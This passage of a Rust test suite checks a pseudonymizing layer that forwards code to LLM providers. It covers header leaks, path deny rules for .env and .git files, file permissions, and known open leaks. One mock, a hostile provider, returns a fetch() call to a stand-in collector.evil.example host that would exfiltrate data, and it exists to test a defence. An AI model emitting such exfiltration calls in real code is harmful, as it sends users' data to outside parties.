                "Add docs.",
                vec![file(f, None)],
            ))
            .await;
        assert_eq!(out.status, Status::Blocked, "{f}");
    }
    assert!(posts(&s).await.is_empty());
    // one bad file poisons the whole request: nothing partial is sent
    let out = pl
        .run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![
                file("src/egress.rs", Some((18, 30))),
                file("src/link_out.rs", None),
            ],
        ))
        .await;
    assert_eq!(out.status, Status::Blocked);
    assert!(posts(&s).await.is_empty());
}

// LEAK (low): `.gitmodules` and a submodule's `.git` pointer file are not on the read deny
// list (`**/.git/**` only matches below a `.git` directory). When the caller names them they
// are sent: host names are replaced, the submodule layout and repository paths are not.
#[tokio::test]
async fn leak_gitmodules_and_submodule_pointer_are_readable_when_named() {
    let (s, _p, pl) = setup("openai").await;
    for f in [".gitmodules", "vendor/sub/.git"] {
        assert_ok(
            &pl.run(request(
                TaskKind::Summarize,
                "Summarize.",
                vec![file(f, None)],
            ))
            .await,
        );
    }
    let sent = posts(&s).await;
    assert_eq!(sent.len(), 2);
    let (_, gm) = prompt_of(&sent[0]);
    assert!(gm.contains("[submodule \"vendor/sub\"]"));
    assert!(gm.contains(":platform/shared-protos.git"), "{gm}");
    assert!(!gm.contains("git.zephyrine.dev"));
    let (_, ptr) = prompt_of(&sent[1]);
    assert!(ptr.contains("gitdir: ../../.git/modules/vendor/sub"));
}

#[tokio::test]
#[ignore = "LEAK (open): .gitmodules / submodule .git pointer are readable; passes once denied"]
async fn fixed_gitmodules_and_submodule_pointer_are_denied() {
    let (s, _p, pl) = setup("openai").await;
    for f in [".gitmodules", "vendor/sub/.git"] {
        let out = pl
            .run(request(
                TaskKind::Summarize,
                "Summarize.",
                vec![file(f, None)],
            ))
            .await;
        assert_eq!(out.status, Status::Blocked, "{f}");
    }
    assert!(posts(&s).await.is_empty());
}

// ---------------------------------------------------------------------------------------------
// 3. metadata
// ---------------------------------------------------------------------------------------------

const ALLOWED_HEADERS: &[&str] = &[
    "host",
    "accept",
    "user-agent",
    "content-type",
    "content-length",
    "authorization",
    "x-api-key",
    "anthropic-version",
];

/// PASS: by default only transport and auth headers are sent. No X-Title, no HTTP-Referer, no
/// cookies, nothing derived from the user, machine or project.
#[tokio::test]
async fn default_headers_are_transport_and_auth_only() {
    for api in ["openai", "anthropic"] {
        let (s, _p, pl) = setup(api).await;
        assert_ok(&pl.run(canary_request(TaskKind::Docstring)).await);
        for r in all_requests(&s).await {
            for (k, v) in r.headers.iter() {
                let v = String::from_utf8_lossy(v.as_bytes()).to_string();
                assert!(
                    ALLOWED_HEADERS.contains(&k.as_str()),
                    "{api}: unexpected header {k}: {v}"
                );
                match k.as_str() {
                    "user-agent" => assert_eq!(v, middleman::config::DEFAULT_UA),
                    "authorization" => assert_eq!(v, format!("Bearer {FAKE_KEY}")),
                    "x-api-key" => assert_eq!(v, FAKE_KEY),
                    _ => {}
                }
            }
            for absent in [
                "x-title",
                "http-referer",
                "referer",
                "origin",
                "cookie",
                "x-forwarded-for",
            ] {
                assert!(r.headers.get(absent).is_none(), "{absent}");
            }
            assert_eq!(r.url.query(), None);
        }
    }
}

/// PASS: `X-Title` exists only when the user configures it (the example config does); its
/// value is the literal from the config.
#[tokio::test]
async fn x_title_is_sent_only_when_configured() {
    let (s, _p, pl) = setup_with(
        "openai",
        DICT,
        "",
        "headers = { \"X-Title\" = \"middleman\" }",
    )
    .await;
    assert_ok(&pl.run(canary_request(TaskKind::Docstring)).await);
    let sent = posts(&s).await;
    assert_eq!(
        sent[0].headers.get("x-title").unwrap().to_str().unwrap(),
        "middleman"
    );
    assert!(sent[0].headers.get("http-referer").is_none());
    assert!(canaries_in_request(&sent[0]).is_empty());
}

// RISK: the default User-Agent names the tool, so the provider (and any TLS-terminating proxy)
// knows a pseudonymizing delegation layer is in use. It names neither user nor company.
#[tokio::test]
async fn risk_default_user_agent_names_the_tool() {
    let (s, _p, pl) = setup("openai").await;
    assert_ok(&pl.run(canary_request(TaskKind::Docstring)).await);
    let ua = posts(&s).await[0]
        .headers
        .get("user-agent")
        .unwrap()
        .to_str()
        .unwrap()
        .to_string();
    assert_eq!(ua, "Mozilla/5.0 (compatible; middleman/0.1)");
}

#[tokio::test]
#[ignore = "RISK (open): default User-Agent names the tool; passes once it is generic"]
async fn fixed_default_user_agent_does_not_name_the_tool() {
    let (s, _p, pl) = setup("openai").await;
    assert_ok(&pl.run(canary_request(TaskKind::Docstring)).await);
    for r in all_requests(&s).await {
        let ua = r
            .headers
            .get("user-agent")
            .unwrap()
            .to_str()
            .unwrap()
            .to_lowercase();
        assert!(!ua.contains("middleman"), "{ua}");
    }
}

fn dict_surrogate(user: &str, before: &str) -> String {
    let i = user.find(before).unwrap() + before.len();
    user[i..]
        .chars()
        .take_while(|c| c.is_alphanumeric())
        .collect()
}

// RISK: the request shape is a stable fingerprint. Constant system prompt, constant envelope
// (`Task kind:` ... `--- FILE x (from line N) ---` ... `--- END ---`), constant JSON keys,
// recognizable surrogate shapes, and the same dictionary surrogate for the same term for the
// lifetime of one middleman process. A provider can cluster all middleman traffic of one
// account and link requests that mention the same (unknown) name.
#[tokio::test]
async fn risk_request_shape_is_a_stable_fingerprint() {
    let (s, _p, pl) = setup("openai").await;
    assert_ok(&pl.run(canary_request(TaskKind::Docstring)).await);
    assert_ok(
        &pl.run(request(
            TaskKind::Summarize,
            "Summarize what Zephyrine does here.",
            vec![file("src/egress.rs", Some((18, 52)))],
        ))
        .await,
    );
    let sent = posts(&s).await;
    let (sys1, u1) = prompt_of(&sent[0]);
    let (sys2, u2) = prompt_of(&sent[1]);
    assert_eq!(sys1, sys2);
    assert_eq!(sys1, middleman::pipeline::SYSTEM_PROMPT);
    for u in [&u1, &u2] {
        assert!(u.starts_with("Task kind: ") && u.ends_with("\n\n--- END ---\n"));
        assert!(u.contains("\nInstructions:\n") && u.contains("\n\n--- FILE "));
    }
    let keys = |r: &wiremock::Request| -> Vec<String> {
        let v: Value = serde_json::from_slice(&r.body).unwrap();
        v.as_object().unwrap().keys().cloned().collect()
    };
    assert_eq!(keys(&sent[0]), keys(&sent[1]));
    assert_eq!(
        keys(&sent[0]),
        ["model", "max_tokens", "stream", "messages"]
    );
    // same term, two unrelated requests, same surrogate
    let a = dict_surrogate(&u1, "Document the ");
    let b = dict_surrogate(&u2, "Summarize what ");
    assert!(a.len() >= 4 && a == b, "{a} vs {b}");
}

// ---------------------------------------------------------------------------------------------
// 4. audit log of the real runs (opt-in: reads a real file, so it is driven by the environment)
// ---------------------------------------------------------------------------------------------

/// Scans the sanitized payloads in a real audit log for local identifiers.
/// `MM_LEAK_AUDIT_LOG=<audit-YYYY-MM.jsonl>`; optional `MM_LEAK_AUDIT_NEEDLES=a,b,c`
/// (case-insensitive). Prints line numbers and categories only, never values.
#[test]
fn real_audit_log_payloads_have_no_local_identifiers() {
    let Ok(path) = std::env::var("MM_LEAK_AUDIT_LOG") else {
        return; // not requested
    };
    let text = std::fs::read_to_string(&path).unwrap();
    let mut needles: Vec<(String, String)> = Vec::new();
    if let Ok(u) = std::env::var("USER") {
        needles.push((
            "os user home path".into(),
            format!("/users/{}", u.to_lowercase()),
        ));
        needles.push((
            "os user home path".into(),
            format!("/home/{}", u.to_lowercase()),
        ));
    }
    if let Ok(h) = std::env::var("HOME") {
        needles.push(("home directory".into(), h.to_lowercase()));
    }
    for (i, n) in std::env::var("MM_LEAK_AUDIT_NEEDLES")
        .unwrap_or_default()
        .split(',')
        .filter(|n| n.trim().len() >= 3)
        .enumerate()
    {
        needles.push((format!("needle #{}", i + 1), n.trim().to_lowercase()));
    }
    let mut hits = Vec::new();
    let (mut sent, mut total) = (0, 0);
    for (i, line) in text.lines().enumerate() {
        let v: Value = serde_json::from_str(line).unwrap();
        total += 1;
        let was_sent = v["sent"].as_bool().unwrap_or(false);
        sent += was_sent as usize;
        for field in ["sanitized_system", "sanitized_user"] {
            let s = v[field].as_str().unwrap_or("").to_lowercase();
            for (cat, n) in &needles {
                if s.contains(n.as_str()) {
                    hits.push(format!("line {} {field} sent={was_sent}: {cat}", i + 1));
                }
            }
            let home_like = s
                .match_indices("/users/")
                .any(|(j, _)| !s[j + 7..].starts_with("user"));
            if home_like {
                hits.push(format!(
                    "line {} {field} sent={was_sent}: /Users/<name> path",
                    i + 1
                ));
            }
        }
    }
    println!(
        "AUDIT {total} records, {sent} sent, {} needles, hits: {hits:?}",
        needles.len()
    );
    assert!(hits.is_empty(), "{hits:?}");
}

// ---------------------------------------------------------------------------------------------
// 5. response channel
// ---------------------------------------------------------------------------------------------

/// PASS: restore() puts originals back for Claude only. When Claude delegates that restored
/// text again (as pasted input), the second request is sanitized from scratch.
#[tokio::test]
async fn restored_output_is_resanitized_when_delegated_again() {
    let (s, _p, pl) = setup("openai").await;
    let out1 = pl.run(canary_request(TaskKind::Docstring)).await;
    assert_ok(&out1);
    let restored = out1.output.unwrap();
    // the restored answer really carries originals
    for orig in [
        "ZephyrineClient",
        "QuasarLedger",
        "mkaraca",
        "mehmet.karaca@zephyrine.io",
        "10.42.7.19",
    ] {
        assert!(restored.contains(orig), "{orig}");
    }
    assert!(canaries_in(&restored).len() > 30);
    // exactly one completion call so far: restoring never triggers a request by itself
    assert_eq!(posts(&s).await.len(), 1);

    let mut r2 = request(
        TaskKind::Summarize,
        "Summarize the previous answer.",
        vec![],
    );
    r2.inputs = vec![InputText {
        label: "previous answer".into(),
        text: restored,
    }];
    let out2 = pl.run(r2).await;
    assert_ok(&out2);
    assert!(out2.redactions["dictionary"] >= 30, "{:?}", out2.redactions);
    let sent = posts(&s).await;
    assert_eq!(sent.len(), 2);
    let hits = canaries_in_request(&sent[1]);
    assert!(hits.is_empty(), "{hits:?}");
    let (_, user2) = prompt_of(&sent[1]);
    assert!(user2.contains("tenant service") && user2.contains("example.com"));
}

/// PASS: same for file mode. The file middleman wrote (with originals) is sanitized again
/// when it is sent as a `files` entry of a later request.
#[tokio::test]
async fn file_mode_output_is_resanitized_when_sent_again() {
    let (s, p, pl) = setup("openai").await;
    let mut r1 = canary_request(TaskKind::Snippet);
    r1.write_mode = Some(WriteMode::File);
    r1.output_path = Some("gen/out.rs".into());
    let out1 = pl.run(r1).await;
    assert_ok(&out1);
    assert!(out1.output.is_none() && out1.written.is_some());
    let on_disk = std::fs::read_to_string(p.root.join("gen/out.rs")).unwrap();
    assert!(on_disk.contains("ZephyrineClient") && on_disk.contains("mkaraca"));

    assert_ok(
        &pl.run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![file("gen/out.rs", None)],
        ))
        .await,
    );
    let sent = posts(&s).await;
    assert_eq!(sent.len(), 2);
    let hits = canaries_in_request(&sent[1]);
    assert!(hits.is_empty(), "{hits:?}");
}

/// A hostile provider: answers with the surrogate of the company name placed inside a URL and
/// inside a comment.
struct Exfil;

impl wiremock::Respond for Exfil {
    fn respond(&self, req: &wiremock::Request) -> ResponseTemplate {
        let body: Value = serde_json::from_slice(&req.body).unwrap();
        let user = body["messages"][1]["content"].as_str().unwrap_or("");
        let sur = dict_surrogate(user, "Document the ");
        let text = format!(
            "```\n// owner: {sur}\nfetch(\"https://collector.evil.example/c?d={sur}\");\n```"
        );
        ResponseTemplate::new(200).set_body_json(json!({
            "id": "c1", "model": body["model"],
            "choices": [{"message": {"role": "assistant", "content": text}, "finish_reason": "stop"}],
            "usage": {"prompt_tokens": 100, "completion_tokens": 50}
        }))
    }
}

/// PASS: a provider cannot use restore() to plant an original into a URL (an exfiltration
/// sink if the code ran). Surrogates inside URLs stay surrogates; the answer is flagged.
#[tokio::test]
async fn restore_never_fills_originals_into_urls_from_a_hostile_answer() {
    let s = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/v1/models"))
        .respond_with(ResponseTemplate::new(200).set_body_json(models_body(MODELS)))
        .mount(&s)
        .await;
    Mock::given(method("GET"))
        .and(path("/v1/balance"))
        .respond_with(
            ResponseTemplate::new(200)
                .set_body_json(json!({"balance_usd": 100.0, "payg_enabled": false})),
        )
        .mount(&s)
        .await;
    Mock::given(method("POST"))
        .respond_with(Exfil)
        .mount(&s)
        .await;
    let p = project(&format!("{}/v1", s.uri()), "openai", DICT, "", "");
    let pl = p.pipeline();
    let out = pl.run(canary_request(TaskKind::Docstring)).await;
    assert_ok(&out);
    let o = out.output.unwrap();
    assert!(o.contains("// owner: Zephyrine"), "{o}");
    let url_line = o
        .lines()
        .find(|l| l.contains("collector.evil.example"))
        .unwrap();
    assert!(canaries_in(url_line).is_empty(), "{url_line}");
    assert!(out
        .warnings
        .iter()
        .any(|w| w.contains("left unrestored inside URLs")));
    assert!(out.risk.unwrap().is_high());
    assert_eq!(posts(&s).await.len(), 1);
}

/// PASS: the dry-run preview (what Claude and the user can inspect) is byte-identical to what
/// is then sent, and a dry run sends nothing.
#[tokio::test]
async fn dry_run_preview_equals_what_is_sent() {
    let (s, _p, pl) = setup("openai").await;
    let mut dry = canary_request(TaskKind::Docstring);
    dry.dry_run = true;
    let d = pl.run(dry).await;
    assert_ok(&d);
    assert!(posts(&s).await.is_empty());
    let preview = d.sanitized_payload.unwrap();
    assert!(canaries_in(&preview.user).is_empty() && canaries_in(&preview.system).is_empty());
    assert_ok(&pl.run(canary_request(TaskKind::Docstring)).await);
    let (system, user) = prompt_of(&posts(&s).await[0]);
    assert_eq!(system, preview.system);
    assert_eq!(user, preview.user);
}

// ---------------------------------------------------------------------------------------------
// 6. ledger, audit, report, statusline, watch
// ---------------------------------------------------------------------------------------------

fn walk(d: &Path, out: &mut Vec<PathBuf>) {
    out.push(d.to_path_buf());
    if let Ok(rd) = std::fs::read_dir(d) {
        for e in rd.flatten() {
            let p = e.path();
            if p.is_dir() && !p.is_symlink() {
                walk(&p, out);
            } else {
                out.push(p);
            }
        }
    }
}

fn mode(p: &Path) -> u32 {
    std::fs::symlink_metadata(p).unwrap().permissions().mode() & 0o777
}

/// A mixed session: delivered, blocked (evasion), blocked (deny path), file mode, dry run.
async fn mixed_session(pl: &Pipeline) {
    assert_ok(&pl.run(canary_request(TaskKind::Docstring)).await);
    assert_ok(&pl.run(canary_request(TaskKind::WriteTests)).await);
    let b = pl
        .run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![file("src/split_forms.rs", None)],
        ))
        .await;
    assert_eq!(b.status, Status::Blocked);
    let b = pl
        .run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![file(".git/config", None)],
        ))
        .await;
    assert_eq!(b.status, Status::Blocked);
    let mut f = canary_request(TaskKind::Snippet);
    f.write_mode = Some(WriteMode::File);
    f.output_path = Some("gen/out.rs".into());
    assert_ok(&pl.run(f).await);
    let mut d = canary_request(TaskKind::Explain);
    d.dry_run = true;
    assert_ok(&pl.run(d).await);
}

/// PASS: state dir 0700, every file in it 0600. The audit log holds sanitized payloads only.
/// The ledger holds no payload at all; its only project-derived value is the root directory's
/// base name in `project` (local file, used by `report --by project`).
#[tokio::test]
async fn state_files_are_private_and_hold_no_originals() {
    let (_s, p, pl) = setup("openai").await;
    mixed_session(&pl).await;
    let mut all = Vec::new();
    walk(&p.state(), &mut all);
    assert!(all.len() >= 3, "{all:?}");
    for f in &all {
        let want = if f.is_dir() { 0o700 } else { 0o600 };
        assert_eq!(mode(f), want, "{}", f.display());
    }
    let mut audit_records = 0;
    for f in all.iter().filter(|f| f.is_file()) {
        let name = f.file_name().unwrap().to_string_lossy().to_string();
        let text = std::fs::read_to_string(f).unwrap();
        assert!(!text.contains(FAKE_KEY), "{name}");
        if name.starts_with("audit-") {
            audit_records += text.lines().count();
            let hits = canaries_in(&text);
            assert!(hits.is_empty(), "{name}: {hits:?}");
            assert!(text.contains("\"sanitized_user\":\"Task kind: docstring"));
            assert!(text.contains("\"original_sha256\":\""));
        } else if name == "ledger.jsonl" {
            for line in text.lines() {
                let mut v: Value = serde_json::from_str(line).unwrap();
                // RISK (local only): the root directory's base name
                assert_eq!(v["project"], "quasarledger");
                v.as_object_mut().unwrap().remove("project");
                let hits = canaries_in(&v.to_string());
                assert!(hits.is_empty(), "ledger: {hits:?}");
                for k in ["instructions", "sanitized_user", "output", "files", "path"] {
                    assert!(v.get(k).is_none(), "ledger has {k}");
                }
            }
        } else {
            let hits = canaries_in(&text);
            assert!(hits.is_empty(), "{name}: {hits:?}");
        }
    }
    assert_eq!(audit_records, 6);
}

/// PASS: `report`, the HTML dashboard, `watch`, the status line and `middleman_status` show
/// counts, models and money. The only project-derived text is the `project` label of
/// `report --by project`.
#[tokio::test]
async fn report_watch_statusline_and_status_show_no_originals() {
    use middleman::report::{self, By};
    let (_s, p, pl) = setup("openai").await;
    mixed_session(&pl).await;
    let entries = pl.ledger().entries().unwrap();
    assert!(entries.len() >= 5);
    for by in ["model", "provider", "task", "day"] {
        let t = report::render_text(&report::build(&entries, None, By::parse(by).unwrap()));
        assert!(canaries_in(&t).is_empty(), "report --by {by}: {t}");
    }
    let by_project = report::render_text(&report::build(&entries, None, By::Project));
    let hits = canaries_in(&by_project);
    assert!(!hits.is_empty() && hits.iter().all(|h| h.starts_with("skeleton:quasarledger")));
    assert!(canaries_in(&report::render_html(&entries, None)).is_empty());

    let mut buf = Vec::new();
    middleman::watch::run(pl.ledger().path(), 100, false, &mut buf).unwrap();
    let watch = String::from_utf8_lossy(&buf).to_string();
    assert!(watch.lines().count() >= 5);
    assert!(canaries_in(&watch).is_empty(), "{watch}");

    let stdin = json!({"session_id": "s1", "workspace": {"current_dir": p.root}}).to_string();
    let line = middleman::statusline::render(&stdin, &p.cfg_path, middleman::ledger::now_unix());
    assert!(line.contains("middleman"), "{line}");
    assert!(canaries_in(&line).is_empty(), "{line}");

    let status = pl.status().await.to_string();
    assert!(canaries_in(&status).is_empty(), "{status}");
    assert!(!status.contains(FAKE_KEY));
}

/// By design (local, trusted side): a block reason repeats the path the caller asked for, so
/// the audit log can contain a company name that was part of a refused path.
#[tokio::test]
async fn audit_block_reason_repeats_the_requested_path_locally() {
    let (s, p, pl) = setup("openai").await;
    let out = pl
        .run(request(
            TaskKind::Docstring,
            "Add docs.",
            vec![file("zephyrine/.env", None)],
        ))
        .await;
    assert_eq!(out.status, Status::Blocked);
    assert!(posts(&s).await.is_empty());
    let mut all = Vec::new();
    walk(&p.state(), &mut all);
    let audit: String = all
        .iter()
        .filter(|f| {
            f.file_name()
                .unwrap()
                .to_string_lossy()
                .starts_with("audit-")
        })
        .map(|f| std::fs::read_to_string(f).unwrap())
        .collect();
    assert!(audit.contains("path denied by rule **/.env*: zephyrine/.env"));
}

// RISK (low): the model catalog cache is world-readable (dir 0755, file 0644). It holds public
// data only (model ids and list prices), no payloads and no key.
#[tokio::test]
async fn risk_catalog_cache_is_world_readable_but_public_data_only() {
    let (_s, p, pl) = setup("openai").await;
    mixed_session(&pl).await;
    let cache = p.dir.path().join("cache");
    let models = cache.join("models.json");
    let text = std::fs::read_to_string(&models).unwrap();
    assert!(canaries_in(&text).is_empty() && !text.contains(FAKE_KEY));
    assert!(text.contains("qwen-mini"));
    assert_ne!(mode(&models), 0o600);
}

#[tokio::test]
#[ignore = "RISK (open): cache dir/file are not private; passes once they are 0700/0600"]
async fn fixed_catalog_cache_is_private() {
    let (_s, p, pl) = setup("openai").await;
    mixed_session(&pl).await;
    let cache = p.dir.path().join("cache");
    assert_eq!(mode(&cache), 0o700);
    assert_eq!(mode(&cache.join("models.json")), 0o600);
}

// ---------------------------------------------------------------------------------------------
// 7. residual risk, quantified on the canary run
// ---------------------------------------------------------------------------------------------

fn identifiers(code: &str) -> BTreeSet<String> {
    code.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
        .filter(|w| w.len() >= 6 && !w.chars().next().unwrap().is_ascii_digit())
        .filter(|w| w.contains('_') || w.chars().skip(1).any(|c| c.is_ascii_uppercase()))
        .map(String::from)
        .collect()
}

// RISK (by design): pseudonymization replaces names, hosts, emails, IPs and home paths. The
// code itself is sent as is: every identifier that is not a dictionary term, every comment,
// every string literal, the structure and the library choices.
#[tokio::test]
async fn risk_identifiers_comments_and_structure_are_sent_verbatim() {
    let (s, _p, pl) = setup("openai").await;
    assert_ok(&pl.run(canary_request(TaskKind::Docstring)).await);
    let (_, user) = prompt_of(&posts(&s).await[0]);
    let real = lines(&repo_file("src/pipeline.rs"), 57, 128);
    // the real-source slice has no detectable item: it is sent byte for byte
    assert!(user.contains(&real));

    let ids = identifiers(&real);
    for id in [
        "DelegateRequest",
        "InputText",
        "declared_sensitivity",
        "expected_output_tokens",
        "approval_id",
        "user_requested",
        "deny_unknown_fields",
        "WriteMode",
        "TaskKind",
        "FileRef",
    ] {
        assert!(ids.contains(id) && user.contains(id), "{id}");
    }
    let comments = real
        .lines()
        .filter(|l| l.trim_start().starts_with("//"))
        .count();
    let literals = real.matches('"').count() / 2;
    println!(
        "MEASURE real slice (72 lines): {} project identifiers sent verbatim: {:?}",
        ids.len(),
        ids
    );
    println!(
        "MEASURE real slice: {comments} comment lines and {literals} string literals sent verbatim"
    );
    assert!(ids.len() >= 15 && comments >= 8);
    // comments carry design intent, and here even the product's own name
    assert!(
        user.contains("routing.mode = \"confirm\": set after the user approved the dry-run plan.")
    );
    assert!(user.contains("`middleman approve <id>`") && user.contains(".middleman.new"));
    // libraries / frameworks
    assert!(user.contains("#[serde(default)]") && user.contains("Deserialize"));

    // in the canary file: structure and suffixes survive, so do non-dictionary words
    assert!(user.contains("Client {") && user.contains("_tenant_id: u64"));
    assert!(user.contains("_region: String") && user.contains("BaseUrl(&self)"));
    assert!(user.contains("Mehmet ")); // a first name that is not in the dictionary
    assert!(user.contains("/work/")); // the path below the home directory
}

// LEAK (low): only the host of a URL is replaced. Port, path, repository path and database
// name are sent verbatim.
#[tokio::test]
async fn leak_url_path_port_and_database_name_are_sent_verbatim() {
    let (s, _p, pl) = setup("openai").await;
    assert_ok(&pl.run(canary_request(TaskKind::Docstring)).await);
    let (_, user) = prompt_of(&posts(&s).await[0]);
    assert!(user.contains(".example.net:8443/v2/charges"), "{user}");
    assert!(user.contains(".example.net/platform/"), "{user}");
    assert!(user.contains(":5432/ledger\""), "{user}");
}

#[tokio::test]
#[ignore = "LEAK (open): URL path / port / db name are sent; passes once they are replaced"]
async fn fixed_url_path_port_and_database_name_are_replaced() {
    let (s, _p, pl) = setup("openai").await;
    assert_ok(&pl.run(canary_request(TaskKind::Docstring)).await);
    let (_, user) = prompt_of(&posts(&s).await[0]);
    for part in ["/v2/charges", "/platform/", ":8443", ":5432/ledger"] {
        assert!(!user.contains(part), "{part}");
    }
}

// LEAK: the project root is replaced by `/workspace/app` only when the next character is not
// `.`, `-` or a word character. A root at the end of a sentence ("the repo is at <root>.")
// is sent with every directory above it; only `/Users/<name>` (or `/home/<name>`) and
// dictionary terms inside it are replaced.
#[tokio::test]
async fn leak_project_root_before_a_full_stop_is_sent() {
    let (s, p, pl) = setup_fixed("mmleak-root-b").await;
    let root = p.root.to_string_lossy().to_string();
    let tmp_name = p
        .dir
        .path()
        .file_name()
        .unwrap()
        .to_string_lossy()
        .to_string();
    let out = pl
        .run(request(
            TaskKind::Summarize,
            &format!("The repo is at {root}. Summarize the file."),
            vec![file("src/egress.rs", Some((18, 20)))],
        ))
        .await;
    assert_ok(&out);
    let sent = posts(&s).await;
    let (_, user) = prompt_of(&sent[0]);
    assert!(user.contains(&format!("/{tmp_name}/")), "{user}");
    assert!(!user.contains("The repo is at /workspace/app."));
    // the dictionary still catches the company and product directory names
    assert!(canaries_in_request(&sent[0]).is_empty());
}

#[tokio::test]
#[ignore = "LEAK (open): root followed by '.' is not replaced; passes once it is"]
async fn fixed_project_root_before_a_full_stop_is_replaced() {
    let (s, p, pl) = setup_fixed("mmleak-root-c").await;
    let root = p.root.to_string_lossy().to_string();
    let tmp_name = p
        .dir
        .path()
        .file_name()
        .unwrap()
        .to_string_lossy()
        .to_string();
    let out = pl
        .run(request(
            TaskKind::Summarize,
            &format!("The repo is at {root}. Summarize the file."),
            vec![file("src/egress.rs", Some((18, 20)))],
        ))
        .await;
    // either replaced or refused, never sent
    for r in posts(&s).await {
        let (_, user) = prompt_of(&r);
        assert!(!user.contains(&tmp_name), "{user}");
        assert!(user.contains("The repo is at /workspace/app."));
    }
    assert!(out.status == Status::Ok || out.status == Status::Blocked);
}
